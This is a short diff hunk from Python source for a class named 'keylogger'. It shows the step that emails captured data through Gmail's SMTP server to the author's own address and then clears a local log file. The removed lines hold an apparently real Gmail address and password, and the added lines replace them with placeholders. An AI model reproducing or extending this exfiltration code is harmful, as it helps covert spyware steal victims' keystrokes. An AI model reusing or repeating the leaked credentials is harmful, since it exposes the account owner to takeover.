@@ -58,8 +58,8 @@ class keylogger():
                 
                 smtp = smtplib.SMTP('smtp.gmail.com')
                 smtp.starttls()
-                smtp.login("thaaoblues81@gmail.com","theo2105")
-                smtp.sendmail("thaaoblues81@gmail.com","thaaoblues81@gmail.com",msg.as_string())
+                smtp.login("exemple@gmail.com","exemple_password")
+                smtp.sendmail("exemple@gmail.com","exemple@gmail.com",msg.as_string())
                 smtp.quit()
                 self.file = open("asp.BLUE","w")
                 self.file.close()
